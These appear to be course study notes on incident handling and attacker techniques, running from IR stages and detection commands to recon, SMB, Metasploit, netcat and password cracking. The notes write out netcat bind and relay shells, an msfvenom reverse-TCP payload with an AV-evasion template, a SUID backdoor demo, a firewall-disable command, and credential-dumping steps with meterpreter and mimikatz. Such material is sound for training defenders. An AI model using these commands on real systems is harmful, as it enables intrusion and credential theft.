NIST IH: http://nvlpubs.nist.gov/nistpubs/SpecialPublications/NIST.SP.800-61r2.pdf
Incident: Adverse event in an information system or network / implies harm or attempt to harm
Event: Observable occurrence in a system or network
	Corroborating evidence: one that supports original evidence

Incident Handling: Action plan for dealing with misuse of computer systems and networks (e.g. social eng, insider threat, targeted malware, automated malware, worms (segment,multi-exploit/multi-platform, patching required)
  Intrusion | Malicious code infection | Cyber theft | Denial of service | other security related events

Incident Management: synonymous with incident handling (Incident manager is the commander / decision maker for the IH)

Incident Response:  Technical components required to analyze and contain an incident
	Forensics: Part of IR, identifying exactly what happened based on disks, memory, logs, network flow, etc.

False attribution - making your malware seem like it belongs or was created by someone else.
-	For instance, the US government making it seem as if their tools were created by the Chinese government.

# IR Process
6 stages of IH process:
[SANS] Preparation – Identification – Containment – Eradication – Recovery – Lessons Learned
[NIST] Preparation – Detection & Analysis – Containment, Eradication, and Recovery – Post-Incident activity

Preparation: (get the team ready to handle incidents)
•	People: Most overlooked aspect of security posture; (spear phishing, social engineering, etc.)
•	Policy: Banners like ‘use of system is monitored and recorded’, etc. are crucial (careful with GDPR)
o	Law Enforcement: Usually takes victim’s consent before taking to media but not obliged to do so.
	Might ask to watch attacker, to gather more evidence
o	Taking handwritten notes is useful; go slow without making mistakes (costly)
o	Takes notes of Who, What, When, Where, Why and How (Who/why: most difficult in intrusions)
Building an IR team:
~10% availability from different departments (security, network, HR, legal, public affairs, DR / BCP, Union)
Create a WAR room: Display information easily
•	Data: 
SANS IH forms: https://www.sans.org/score/incident-forms & https://www.sans.org/score/
Federal Reserve's Suspicious Activity Report at
www.federalreserve.gov/boarddocs/press/general/2000/20000619/form.pdf
•	Software / Hardware, Communications, Supplies, Transportation, Space, Power and Environmental Controls, Documentation
Free and Open source IH framework: https://github.com/google/grr (Google Rapid Response)
Jump Bag: Tools need to work thru an incident
-	Forensics:
o	Sleuth Kit and Autopsy (free at sleuthkit.org)
o	EnCase (commercial software from Guidance Software)
o	Forensic Toolkit Imager (FTK Imager): (commercial f/ AccessData) (evidence collection software)
o	X-Ways Forensics software (commercial)
-	Get USB Token RAM device (at least 16 Gig)
-	External hard drive USB2/3 and possibly Firewire and Thunderbolt
-	Ethernet TAP (4-8 ports preferable, 100/1000 Mbps), don't get a switch, taps are preferred (NetOptics are popular)
-	Patch cables (2 straight-through, and one crossover)
-	USB cables and serial cables for routers and other network equipment
-	Laptop with multiple operating systems

Identification: Identify an attack by looking for unusual:
Processes and services, Files, Network usage, Scheduled tasks, Accounts, Log entries, Supporting 3rd party tools
WHERE TO CHECK
•	Detection on network perimeter and network devices: tcpdump -nn port <port> (-s0, snap length 0, capture all packets)
•	Detection on host perimeter: netstat -naob (o = PID, b=process name, s=stats, r=route, n=numbers only)
•	Detection on system / host (end point protection): 
o	Symantec is sticky, it will open windows to force quarantine
o	Sophos and other AV tools show a fading balloon on the bottom right corner
•	Detection apps: web apps (logs, HTTP data, etc.)

WHAT TO CHECK
Examining:
•	SMB usage: net view \\<ip> | net session (inbound SMB) | net use (outbound SMB) | nbtstat -S
o	Used for identifying lateral movements by attackers after gaining access to our systems
•	TCP/IP usage: netstat -na | -naob | netsh  advfirewall show currentprofile
•	Processes: tasklist /v | tasklist /m /fi “pid eq pid”  | taskmgr.exe  (Linux: ps aux and lsof –p [pid])
•	Processes with wmic: wmic process list full | brief | wmic process get name,parentprocessid,processid
o	wmic process where processed=[pid] get commandline
•	Services: services.msc | net start | sc query | more | tasklist /svc (all services started by that process)
•	Auto Start Extensibility Points (ASEP) in Registry:  HKLM | HKCU | HKU for Run, RunOnce, RunOnceEx
o	msconfig.exe | wmic startup list full | dir /s /b "c:\Users\vasu\Start Menu"
o	reg query hklm\software\microsoft\windows\currentversion\run
o	Check startup items:
	dir /s /b "c:\documents and settings\[username]\Start Menu\"
dir /s /b "c:\users\[user_name]\Start Menu\"
•	Historical USB usage: reg query HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Enum\USBSTOR
o	wmic /node:@systems.txt diskdrive get interfacetype,mediatype,model /format:csv > usb_list.txt
•	User accounts: lusrmgr.msc | net user | net localgroup administrator
o	Get current logged in users in Windows: wmic computersystem get username
	wmic /node:@systems.txt computersystem get username /format:csv > LoggedIn.txt
•	Files: check drive size for sudden decrease or increase
o	Check for very large files:
	FOR /R c:\ %i in (*) do @if %~zi gtr 10000000 echo %i %~zi
•	Sometimes an attacker runs a backdoor or stashes some data on a Linux machine and unlinks it so that it doesn't appear in the normal directory structure. We can find such files using:
o	#lsof +L1    [shows files with a link count less than 1 (that's 0 to you and me)]
•	Run debsums to verify Debian packages (especially those in /sbin, /bin, /usr/bin)
•	Unusual Network Usage in Linux:   #lsof -i    |   #netstat -nap   |   #arp -a
•	Look for cron jobs scheduled by root and any other UID 0 accounts:    #crontab -l -u root
•	Look for unusual system-wide cron jobs:   #cat /etc/crontab    |    #ls /etc/cron.*
•	Unusual accounts: Look in /etc/passwd for new accounts, sorted from lowest to highest UID:
#sort /etc/passwd -nk3 -t: | less
•	Also look for UID and GID 0 accounts:     #grep :0: /etc/passwd
•	Attackers leave non-existent users as owners for files in Linux:    #find / -nouser -print
•	Linux: check system load (CPU): $uptime   |   Memory utilization:  $free      | HDD space:  $df
•	Scheduled Tasks: schtasks (those which run as SYSTEM, users in admin group, blank username, etc.)
o	'schtasks' command also show jobs created with 'at'
•	Event Logs: wevtutil qe security /f:text  (win 7 to win 10) | eventquery.vbs /L security (before win7)
o	secpol.msc, eventvwr.msc (check Security log or Windows logs and Security)
	Generate an event running 'runas /user:administror cmd.exe", type a bogus password in when asked for a password.
	Look at your Event Viewer and Hit refresh (F5 key)
o	Local Policies - Audit Policy - Audit Logon Events - select Failure
•	System crashers or performance monitoring | Use of Sysinternals tools from Microsoft

Other checks in Linux:
Unusual Files - SUID Root:
#cd /tmp
#cp /bin/sh /tmp/backdoor     (any user who runs this program is given root access):
#chmod 4111 /tmp/backdoor
(look for SUID files):  #find /tmp -uid 0 -perm -4000 -print
(then remove the backdoor):  #rm /tmp/backdoor

Unusual Files - Unlinked:
#cp /tmp
#cp /home/tools/netcat/nc /tmp/nc
#/tmp/nc -l -p 2222 &
#ls /tmp/nc -l
#unlink /tmp/nc
#ls /tmp/nc -l
#ps aux | grep /tmp/nc
#lsof +L1
#killall nc

Network Usage - "lsof -i"
#nc -l -p 2222 &
#lsof -Pi

Unusual UID 0 Accounts:
- look for UID 0 accounts with grep
- create a new UID 0 account called test with useradd
- look for UID 0 accounts again with grep
#grep :0: /etc/passwd
#useradd -i -u 0 -s /sbin/nologin test
#grep :0: /etc/passwd

Sorting Accounts:
- run the sort command and look for your test account
- delete your test account when finished
#sort /etc/passwd -nk3 -t: | less
#userdel -r test

Unusual Log Entries:
- run tcpdump to force the interface into promiscuous mode
- look in /var/log messages with grep to see promisc log entry
#tcpdump host 10.10.75.1 &
#grep promisc /var/log/messages
#killall tcpdump

Establish Chain of Custody | ‘dd’ tool can be used to make bit-by-bit copy of system’s hard drive.
Initial Security Incident Questionnaire for Responders:
http://zeltser.com/network-os-security/security-incident-questionnaire-cheat-sheet.html 

Containment: Stop the bleeding! Deploy same set of people involved in Identification phase.
1.	Short-term containment
2.	Evidence collection
3.	Long-term containment

Starts with case classification:
Incident category: DoS | Compromised Information | Compromised Asset | Internal Hack | External Hack | Malware | Policy violation
Criticality (affects response time): Level 1,2,3
Sensitivity (affects who should be notified):  Level 1,2,3

Request Tracker for Incident Response (RTIR): CyberSponse (commercial) & https://bestpractical.com/rtir (free)

Capturing Forensics image: Volatility framework and Rekal can capture and analyze memory 
Write Blockers & Drive Duplicators

Assigning faults may be done during lesson learned stage, not containment stage.

Eradication: Remove the malware (symptom) and also fix the root cause (how the attacker got in the system in the first place) | Restore from backups | Remove malware | Improve defenses
-	The business unit decides whether to keep the compromised system on or not! We can only recommend!

Recovery: (Called Monitoring): Put system back to production in safe manner (based on owner’s needs w/ a signed memo), validate the system, run UAT
-	Look for artifacts for attacker returning
-	Window to recover and ask for money after an incident is for 3 months!

Lessons Learnt: Document what happened and improve our capabilities
Conduct meetng (within 2 weeks of resuming prod) to review IR report (keep meeting short/0.5day, professional)
  Apply fixes: (internal policy changes, new security protection software purchase, etc.)

# Enterprise-wide IR
Most malware passes through one or more of these: Web Proxy, DNS Cache and Connection logs
-	Dump your current DNS cache and let it rebuild for 1 month, then run the dns-blacklists.py and you can find malware on your network. | DNS malware domains list: https://www.malwaredomainlist.com/mdl.php
-	Be smart: "if you try to see everything, you will see nothing!"

Real Intelligence Threat Analytics (RITA): https://www.activecountermeasures.com/free-tools/rita/ for connection logs
zeek.org (network security monitoring tool) : Traffic logging, File extraction, Custom traffic analysis (scripting)
•	The interval consistency of the heartbeat is the TS score, where a value of 1 is perfect.
•	TS Duration is detecting how consistent each connection duration is.
•	Rita also supports domain whitelisting, IP whitelisting and domain name generation algorithms.
wmic product get name, version
wmic /node:@systems.txt product get name,version,vendor /format:csv > SoftwareInventory.txt
(to obtain list of software on all systems in an Enterprise AD) | Else, use SCCM tool
-	IH/IR on network segments, not on 5000 endpoints
Long Tail Analysis: Kansa (required PowerShell 3.0)

Kansa focuses on stacking like systems against each other to provide a ranked listing of processes, network connections, and configurations of systems! This is all part of statistical long-tail analysis!
For functionality, install Handle.exe and autorunssc.exe from Sysinternals from Microsoft.
For the machine launching the scripts, install LogParser from Microsoft.
On all target systems, run the following command to enable Windows Remote Management:
                     c:\winrm quickconfig
     Add all hosts you want checked into a text file and loaded in the Kansa-Master directory!
Kansa supports the ability to pull the total count for specific things, such as Auto Start Entry Points (ASEP).
In the following example, notice the count column on the left side, which contains MD5 hashes. These can be checked on websites, to make sure they have not been modified!
         .\kansa.ps1 -Targetlist .\hosts.txt -ModulePath .\Modules -verbose -Analysis
Look for things that are different and things that show up only on a few systems!

Use of critical security controls from AuditScripts: https://www.auditscripts.com/free-resources/critical-security-controls/
Tips:
-	Excel or another spreadsheet helps, but is not necessary.
-	You do not have to know every field of every log file
-	Look for patterns
-	Work as a team... Sometimes talking through what you see helps!
-	If a process was started by explorer.exe, it means someone/the user clicked it!

# Applied Incident Handling
Cyber espionage: Stealing information to subvert the interests of an organization or government
Check CyberCrimes in other countries: http://www.hg.org/computer-crime.html 
Espionage: Target analysis: protecting Patents, Copyrights, Business processes, etc.
•	Identification: before/after work access, work weekends, volunteering to emptying paper recycling, pattern of access violation, Leak seeding (e.g. web bugs via canarytokens.org, etc.), etc.
•	Maximize data collection: Records from badge access systems, Phone records from PBX, Surveillance videos, etc.

Unauthorized Use: User is allowed normal access but is abusing it; 
IH is mostly on email and inappropriate web surfing; Pull data / proofs from all possible sources
	Filtering web proxies (as protection measure): Forcepoint, Symantec Blue Coat, etc.

Insider Threats: Internal employees, business partners, etc. with knowledge/access to internal data or systems
	With approval from HR, we can identify: Equipment being used, OS being used, IP address, HTTP activity, Monitor IP with IDS tools, Email, Monitor phone numbers called, Background check data, work habits, perform an after-hour visit to check his/her desk, photo of equipment, create system image, etc., Review collected evidence.

Legal Issues and Cybercrime laws:
-	Traditional crimes facilitated by a computer use
-	Crimes in which computer is the target
1.	US DOJ COMPUTER CRIME AND INTELLECTUAL PROPERTY SECTION (CCIPS) https://www.justice.gov/criminal-ccips
2.	International and Foreign Cyberspace Law Research Guide: from George Town Law Library http://guides.ll.georgetown.edu/c.php?g=363530&p=4715068

# Attack Trends
Sample permission letter to attack: https://counterhack.net/permission_memo.html
“no free bugs” movement -> Some vendors are not releasing exploits publicly
Attacker motivation: Hacktivism, Ransomware

Breakout time: Per CrowdStrike 2019 report, Russia: 20 min | N. Korea: 140min | China: 240 min | Iran: 309 min

# Reconnaissance ('casing the joint')
Open Source Intelligence
Reverse Information lookup: https://viewdns.info/
Certificate transparency: Required CAs to publish certificate issuance logs
-	Identify unknown targets associated with organization
-	Presence of new hosts that have not yet been advertised as available
 
OSINT: https://haveibeenpwned.com/
Spiderfoot, Maltego, ReconNG  careful about false positives (https://github.com/smicallef/spiderfoot)
Anything that is not Googleable = Dark web
Moving out of OSINT:- When we start to actively interact with an organization
https://github.com/ustayready/CredSniper : Phishing site for login credentials
Phishing Frameworks: sptoolkit and Phishme

DNS Interrogation
Zone Transfer: nslookup & server=<dns> & ls -d <domain> (Win) | dig @dnsserverip <domain> -t AXFR (Linux)  
DNS uses port 53 (general queries: UDP but for zone transfers, it is TCP).
Website searches
SEC’s Edgar database for publicly traded US companies: http://www.sec.gov/edgar.html 
UserID being used: search at https://namechk.com/
Pushpin: Searches photos, social media posts, etc. from a GeoIP based on latitude and longitude / radius

Search Engines as Recon tools
site: (searches only within that domain) | link: (searches all sites linked to that domain) | intitle: (shows pages with title search criteria) | inurl: (shows pages with URL search criteria) | related: (shows similar pages) | cache: (Google’s cache search) | filetype is same as ext (available remote desktop systems: ext:.rdp)
	For video cameras: inurl:"ViewerFrame?Mode="

FOCA: metadata extraction (usernames, vuln soft version, directory paths) for docs (images, pds, docx, etc.)
Google Webmaster tools: E.g. can ask Google to re-crawl own URL

Maltego Recon Suite
Works with transforms | Commercial: ~760 USD per year 
Transforms: DomainToPhone_Whois | DomainToMXrecord_DNS | DomainToPerson_PGP | IPAddrToPhone_Whois | PersonToPerson_PGP | EmailAddressToEmailAddrSignedPGP
Best defense against this tool: Run it ourselves internally and check periodically
Web-based Recon and Attack sites
Shodan.io | tools.dnsstuff.com | www.network-tools.com | www.securityspace.com
Shodan: uses HTTP banners instead of text search like in Google. Advanced search operators: org, net, port | negate searches with ! (exclamation)
www.dnsstuff.com | www.tracert.com | www.traceroute.org | www.network-tools.com | www.securityspace.com

# Scanning
War dialers dial a sequence of phone numbers attempting to locate a modem carriers or secondary dial tone
(Useful for attacking out of band communications)
Tool: WarVOX for War Dailing
Defenses: Have model policy for out of band access | Strong PIN for phones | Conduct war dialing exercises

War Driving 
https://www.metageek.com/products/inssider/
Wi-Fi Analyzer for Android 
Kismet: Identify Wi-Fi networks and clients, along with encryption type, router MAC address, etc.
(Bluetooth and Zigbee is also supported by Kismet)
Kismet can also do packet capture (enable log, export as pcap)

WPA uses TKIP and WPA2 uses AES (128 bit key in CCMP mode) and WPA3 uses AES (256-bit key GCM mode)
aircrack-ng: use to crack Wi-Fi passwords using a word list and pcap files
airdecap-ng: use to decrypt a PSK packet 
Wi-Fi pineapple configuration: http://172.16.42.1/
ILMN (I Love My Neighbors) tool manipulates browser activity for “Wi-Fi guests”.
Hostapd-WPE (Wireless Pwnage Edition): Impersonate WPA2 networks to harvest user credentials (by downgrading authentication) and tricking users
Other: ZigBee, Bluetooth, Z-Wave, RFID (door locks), etc.
Jackit: wireless keyboards attacked

Wireless IDS tools are coming up: Aruba Networks, Motoloa AirDefense, AirMagnet, etc. (prevent renegade WiFi)
Handheld Wi-Fi Scanning devices: NetScout AirCheck G2 (active and passive scans)

# Network Mapping with NMAP
Firewall turn off on windows: netsh advfirewall set allprofiles state off (In Linux: iptables -F)
NMAP: Find active live hosts (nmap -sP ip/24), then port scan (nmap -A ip/24);
-	Sends 4 packets to identify UP hosts: ICMP Echo | TCP SYN to port 443 | TCP ACK to port 80 | ICMP Timestamp request
By default, NMAP Scans each target before port scanning it (can be ignored using -PN flag) 
Defense: So disable ICMP echo request and Time Exceeded requests to prevent from Active host discovery

   Cont Bits: SYN, etc. 
 (IP Identification: used for Covert_TCP)

NMAP Scan Types:
Ping Sweeps, ARP Scans | Connect TCP scans | SYN scans | ACK scans | FIN scans | FTP proxy “bounce” scan | Idle scan | UDP Scan (must have application data in packet) | Version Scan
--reason: will tell how nmap found port open/closed | --badsum: RST packet w/ bad checksum to chk deny from f/w
ACK scan for port is useless (open or close port, response is always RST) but useful for network mapping.

TTL: 128 for Linux | 64 for Windows computer | 255 for CISCO IOS, Solaris
>30 methods for OS fingerprinting

ndiff <baselinescan.xml> <newscan.xml>  // compare two NMAP XML outputs…

Masscan: Sends a lot of SYN packets from one process and another process looks for the SYN/ACK responses from targets. To reduce time for large network scans.
EyeWitness: Takes screen shots of websites, VNC, RDP services. https://github.com/ChrisTruncer/EyeWitness 
Remux (Python script) goes thru bunch of open proxies online (now suppressed) / Fireprox: Uses Amazon’s API Gateway to federate scans (very fast, very stable, Amazon is allowing it to happen)

Linux: lsof (list open files) command shows processes and services running (filter by process ID with -p <id>)
lsof -p 5156
Disable services in Linux by altering /etc/rc.d files or systemd command 

# Evading IDS/IPS
Many IDS/IPS do not validate TCP checksums due to overhead.

# Vulnerability scanners
Tests against known exploits | What about unknown? | Defense in depth is required | Generates pretty reports
Nessus has HTML5 based web client to interact with server. (Safe Checks is the GUI option that turns off dangerous plugins)
-	Plugins are written in C | NASL (Nessus Attack Scripting Language) (nessus-update-plugins is the cmd for manual update, else it is done automatically every 24 hours)
-	Review results by plugin IDs and not by IP addresses

Linux Services to shut off:
-	/etc/inetd.conf or /etc/xinetd.d and rc.d files

# SMB Sessions
TCP port: 137 (SMB over NETBIOS) or 445 (SMB over IP).
net use \\ip   |  net view \\ip  |  net view (without any IP will check all systems on the domain) | net session \\ip
To delete: net use \\ip /del    |     net session \\ip /del

SMB password guessing:
net user /domain > users.txt   (just the attacker has to authenticate as regular user on the domain)
notepad pass.txt
Iterate the pass.txt for all list of users.txt on the domain to know poor passwords in the domain.
Having a blank password for user in Windows will fail SMB remote attacks.
enum -U <ip> or enum -G, enum -P (pull up domain users, associated groups, password policies): enum tool

sharpview (gets domain and server information from remote computers)
 
PowerShell Empire (backdoor built in powershell, modules under situational_awareness directory).

BloodHound: Graphs the quickest way to get domain administrator privileges. Look for systems that has domain admin group added to local admin group and try to steal the token of that domain admin user.
-	Lots of SMB traffic internally (when trying to detect with packet sniffers)
-	Best is to do event log analysis        https://github.com/adaptivethreat/BloodHound 
BloodHound will not perform VLAN hopping

SMB from Linux
$ smbclient -L //ip -U userid -m SMB2 
smb: \> cmds to enter here (ls,cd,get)
$ smbclient //[WinIP addr]/test -U [username] -p 445
$ rpcclient -U userid <ip>   
rpcclient $> srvinfo                    ====>

Defenses for SMB:
-	Block SMB ports on internal workstations (TCP/445,135,137,139 & UDP/445,137,138)
-	Change default password length from 5 to another one (for SAMBA servers)
-	Modify windows registry: RestrictAnonymous, RestrictAnonymousSAM, EveryoneIncludesAnonymous
Port 135: RPC/DCE endpoint mapper | 137: NetBIOS Name service | 138,139: NetBIOS Session service

# Exploitation
Physical access: 
-	Use of Kon-boot (USB boot attack, where any password is accepted as correct password)
•	Accesses LSASS (memory override at startup): Kon-boot alters the kernel of windows & some Linux, gives access as admin without a password (to be used in case of only admin account locked out or forgot password)
o	Defense: Set BIOS password and disable USB bootup
-	Inception: Unlock an already powered ON and locked PC with DMV Direct Memory Access firewire / Thunderbolt connection (good for systems with hard drive encryption)
-	LAN turtle + Responder: Malicious USB Ethernet adapter to make system generate DNS queries and responder captures hashes (Disable LLMNR, Link Local Multicast Name Resolution, for defense)
-	Rubber Duckies (Human Interface Devices HID) not a drive. USB based! Ducky script (Disable USB as defense)

# Netcat (Living of the Land, LOL tool)
Netcat: original data exchanger across ports | Ncat: a variant of netcat, from nmap    (client and listening modes)
DNScat, Cryptcat, Linkcat, Gcat, Ncat, etc.
Data transfer (TCP or UDP), Port scan (nc -v -w3 -z 192.168.0.1 0-65535), Vuln scan, Connect to open ports, Backdoors (persistent backdoors using while loops of listening ports and nohup), Relays (using pipes in Linux to send output from listener as input to another connection and vice-versa).
-z means minimal data to be sent.   |    nohup: no hang up;
                    Nmap client connection support source routing / enabling the possibility for spoofing
Relay in Linux / Unix: (Defense: carefully architect the network with layered security, defense in depth)
Machine-1:
	$ nc -l -p 54321 -e cmd.exe                    (-L listen harder / persistent mode, Windows only)
Machine-2:                                                              (Telnet doesn’t support UDP port but Netcat does support (-u))
$ mknod backpipe p
$ nc -l -p 11111 0<backpipe | nc ip1 54321 1>backpipe                            (FIFO)
Machine-3:
	$ nc ip2 1111
Netcat without -e option:
$ mknod backpipe p
$ /bin/bash 0<backpipe | nc -l -p 8080 1>backpipe
Persistent listener: $while[1]; do echo "Started"; nc -l -p [port] -e /bin/sh; done
Vuln scan scripts: Weak RPCs, NFS exports, weak trust relationships, guessable passwords and FTP vulnerabilities
Defense: Private VLAN, Close used ports, services, etc.

# Network Sniffers
Windows computer checks domain to IP in the order of (fall back in case of failures):
1.	DNS (Domain Name Service) server (Attack Tool: Responder)   #./Responder.py -i vlan0
2.	LLMNR (Link-Local Multicast Name Resolution): (Attack Tool: Responder that can harvest credentials)
3.	NBT-NS (NetBIOS Name Service) (Attack Tool: Responder, python: Responder.py -I eth0)
Attack tools for ARP layer:
1.	Bettercap: Ruby | Typing microsoft.com can show yahoo website | Arbitrary TCP modify (TCP proxy)
2.	Arpspoof: Manipulate IP to MAC address mapping (feeds false ARP messages to LAN) | ARP cache poison
3.	MITMf: ARP cache poison | TCP stream modification attacks

https://www.netresec.com/?page=NetworkMiner NetworkMiner can be used as a passive network sniffer/packet capturing tool in order to detect operating systems, sessions, hostnames, open ports etc. without putting any traffic on the network. NetworkMiner can also parse PCAP files for off-line analysis and to regenerate/reassemble transmitted files and certificates from PCAP files.

# Hijacking Attacks
WPAD: Web Proxy Auto Discovery: Can be attacked by MITMf, Bettercap, Responder
-	Packdoor can harvest full HTTPS URL information (for DHCP or DNS configuration)
-	Disable LLMNR and WPAD as defense mechanism

Buffer Overflow: Metasploit’s msfelfscan (Linux), msfpescan(Win): Defense: Windows Defender exploit guard
  strcpy, strncpy, strcat, sprintf, scanf, fgets, getws, memcpy, memmove      [ID: extra accounts appear in system]
-	Cram Input Brute force tool for buffer overflow (application to crash)    [replaced with Heap Overflow]
-	Microsoft’s automatic crash analysis tool:  “!exploitable”
-	Windows canaries (Protects Integrity by computing keyed hash of RP | block exploit developers to perform buffer overflow attack) (Random, XOR, Terminator)
-	By using NOP Sled (improved odds of buffer overflow attack to work)
-	Stack: Last In First Out (LIFO)
 

Metasploit modules: exploit, auxillary, payload, post module
-	Over 1850 exploits for all platforms (win, *nix, android, ios, servers, databases, etc.), 32 and 64 bit
-	Payloads can be exported in c, perl, ruby code
-	Meterpreter (big payload): DLL injection into running process (Win, Linux, Java, Python, Android, Web targets)
o	VirtualAllocEx is the API call to allocate free space
o	multisessions possible / gps locations / webcam
o	meterpreter > run post/windows/gather/smart_hashdump  (for reading from disk)
o	meterpreter > run hashdump (read from registry) | meterpreter> hashdump (read from memory)
o	meterpreter > ps (list running process w/ PID) |  meterpreter> migrate <pid>
-	has routines for exploit development  (a simple reboot will remove the exploit from target system)
https://www.cobaltstrike.com/ -> post exploitation agent and covert channels to emulate long term session

msfelfscan (Linux) & msfpescan(Win) is used to search vulnerabilities in machine language of executables & libraries within target system
Shellcode generation wrappers will generate shellcode payloads that are configured to avoid detection on a target system
Privilege escalation can be used to alter NTFS timestamps and dump password hashes from the SAM registry key 
IDS evasion encoders will encode an exploit and payload for delivery on a target system
Protocol parser (lack of bound checks) and file parsers (compress & decompress) have buffer overflow problems 
Endpoint Bypass: Run_On_Open is possible with PowerPoint file
-	start a malware through a trusted binary (bypasses endpoint protection)

Veil Evasion: and Magic Unicorn (python):    Use to generate payload that bypasses Antivirus
#msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=443 -x templates/write_x64.exe -f exe -o msf64_rtcp443.exe
Ghostwriting: Decompile Exe to Assembly (.asm), change code, Compile back to Exe  bypass antivirus
InstallUtil-ShellCode.cs  Uses Microsoft’s uninstall binary to install malware

# Password attacks
PAM: Pluggable Authn Modules | Link Linux / Unix to external authn: RADIUS, Kerberos, etc.
Enforce pwd complexity:
•	pam_passwdqc (custom w/ cmd line tools) | pwqcheck (test for complex req) | pwqgen (generate pwd)
Encrypted or hashed passwords are often referred to as password representations.
Windows stored in SAM table + AD and Linux in /etc/shadow file.
Password spraying: Using a small set of passwords against a large set of usernames (to avoid account lockouts)
•	Password guessing
o	Tends to be slower than password cracking (although depends on network and system perf)
•	Password cracking
o	Stealing encrypted / hashed passwords and guessing/decrypting on attacker’s own methods
o	Stealthier than password guessing
o	Doesn’t lock out accounts
•	Windows LANMAN passwords are all uppercase after cracked; 2n possibilities for actual password after cracking
•	Interesting files to look for, after successful exploitation: 
o	Linux: /etc/passwd and /etc/shadow
o	Windows: SAM file
o	Active directory: Ntds.dit
o	John the ripper's john.pot file
•	‘net accounts’ command on windows will display policy info regarding password management
•	‘wmic useraccount list brief’ command on windows displays accounts and SID value of each user (admin as 500 as SID and guest has 501 as SID and all user created accounts begin from 1000 SID)
•	‘grep tally /etc/pam.d/*’ command on linux displays whether account lock out is place or not
•	Tool for extracting user password hashes from Microsoft Active Directory's (domain controller) ntds.dit file  https://github.com/csababarta/ntdsxtract 
•	PBKDF2: Flexible number of rounds (2 hashes per round): Scrypt requires 1000x times memory

LANMAN Hash:
•	Break into 7 character pieces, then apply each as DES key onto constant: KGS!@#$%    No salt!
NT Hash:
•	MD4 hash of full user’s password (up to 256 characters long). No salt is used during the hash process.

LANMAN client-server authentication:
•	Break into 7-character pieces, then apply each as DES key on the challenge and finally combine
NTLMv1 client -server authentication (not password hash)
•	Same as LANMAN client-server auth, but starts with NT hash (MD4)
NTLMv2 client-server authentication: (not password hash)
•	Server challenge and client challenge
•	NTLMv2 OWF = HMAC-MD5 (username + domain) with NT hash as key
•	Client response = HMAC-MD5 (server challenge) + timestamp + client challenge + other uSsing NTLMv2 OWF


THC-Hydra: (Password Guessing)
•	Password guessing tool based on wordlist. Just type ‘hydra’ or ‘xhydra’ (GUI) for running it
•	-l : lowercase; -u: Uppercase; -n: Numbers; -p: Printable chars not in lower/upper/num; -s: Special chars
•	Includes pw-inspector for trimming the list based on password policy
•	Doesn’t work well for web portals; Works for SSH, RDP, SMTP, SMB, VNC, etc.
•	Use pw_inspector to create customized passwords list file for guessing
o	Cat /tmp/passwords.txt | pw_inspector -m 6 -n -u -l -c 2 > /tmp/passwords1.txt

Linux/Unix user password storage
•	In /etc/shadow, passwords that start with: (No $ indicator at all  DES)
o	$1$  MD5 hash of password with salt
o	_  BSDi Extended DES
o	$2$ or $2a$  blowfish based
o	$5$  SHA256 hash of password with salt
o	$6$  SHA512 hash of password with salt
o	In /etc/passwd, if there is ‘x’, ‘*’, ‘!!’, indicates that password is not present for that user

Windows user password storage and retrieval
	Stored in SAM file in c:\windows\system32\config (not seen after user logged in)
o	Fgdump: Remote SAM password hash dumper (Windows)
	Use mimikatz tool to dump cleartext password from windows memory
o	On meterpreter prompt: “load kiwi” and “creds_all” will provide clear text passwords of users
	VSS (Volume Shadow Copy) to retrieve ntds.dit from Domain Controller  better than dump from memory
	Sniff challenge / response of NTLM v1, v2, Kerberos
	On Win 10, Metasploit’s meterpreter has to jump to lsass.exe process and then run hashdump
o	Or we can run post/windows/gather/smart_hashdump from meterpreter line (easy for John tool)

John the Ripper (not useful for long password cracking jobs)
	unshadow script will combine /etc/passwd and /etc/shadow into single file suitable for cracking by the tool
	john.conf in linux and john.ini in windows
	Crack modes: Single (variations in account), Wordlist, Incremental (brute force), External (own C code), Default (single->wordlist->I)
	john.pot file stores cracked passwords (hash + cleartext) under ‘run’ directory
	john.rec file stores current run status. This file is used during crash recovery. Is undocumented on-purpose
	To know the status of run (press any key): John displays:
o	Number of guessed passwords so far, Time of scan, percentage of completion, combinations per sec, Range of passwords trying so far
	./john –test will give speed of a given system in cracking password hash routines that john can handle
	Support distributed cracking via OpenMP (Open Multi Processing) API and MPT (Message Passing Interface)

Hashcat: (Uses GPUs to accelerate password cracking)
•	Multi-threaded tool for CPUs (18million c/s) and GPUs (1billion c/s); Available for Win and Linux
•	OS hashes, office file passwords, Kerberos tickets      |     (-m 1400 indicates SHA256 hashes)
•	Attack modes: Straight, Combinator (-a 1), Brute force (mask by pwd pattern), Hybrid, (wordlist + mask / vice-versa)
•	Deploying Microsoft LAPS (Local Admin Pwd Soln)  + Credential guard  Good defenses for Hashcat

Cain:
•	Apart from password cracking, Cain can do traceroute, whois, sniffing, etc.
•	Needs wordlists.txt file to load into GUI to crack passwords

Rainbow tables:
•	Storage:
o	Doesn’t store all hashes and passwords. Instead stores info about ‘chains’ from which hashes and passwords can be derived on the fly
o	Clear text password  hash  Reduction function  Iterate or repeat the process around 10,000 times.
o	Finally store original clear text password and final generated password as ‘mapping’ in rainbow table DB
•	Lookup or retrieval:
o	Start with hash to crack  Reduction function  iterate until final password matches end password in above chains
o	Take the initial password in the identified chain and re-apply entire hash and reduction function until hash matches. Once matched, the password that generated the hash is the final cracked one
•	Generating rainbow tables
o	Rtgen tool from project rainbow crack OR Ophcrack has precomp tool
Pass the hash:
•	LocalAccountTokenFilterPolicy registry key (set to 0, to disable PTH attacks)
•	WCE (Windows credential editor) tool for 'pass-the-hash' on windows admin user account (remotely without the need to crack the password hash)  https://www.ampliasecurity.com/research/windows-credentials-editor/ 
o	Can grab and inject LANMAN, NT hash and also with recent versions of WCE, we can inject Kerberos tickets into memory
o	-l (list hashes); -s (inject hashes); -d (remove injected hashes); -K (list Kerberos tokens), -k (inject Kerberos tokens)
•	Meterpreter has inbuilt ‘pass-the-hash’ ability on PSEXEC
o	Instead of cleartext password, admin user ‘password hash’ in [LANMAN]:[NT] format can be used

General info on password hacking
•	When no access to password hashes, try password guessing like Hydra or sniffing cleartext or challenge/response with Cain or tcpdump
•	If we have salted hash from Linux / Unix, use John the ripper (password cracking)
•	If we have LANMAN or NT hash from Windows, use Rainbow tables (Ophcrack), followed by John or Cain
•	If we have LANMAN challenge/response, NTLMv1 and v2 captures, use use cracking with Cain
If we have SMB access, try ‘pass-the-hash’ method (WCE, Meterpreter, nmap’s NSE script for SMB, etc.)

# Web App Attacks
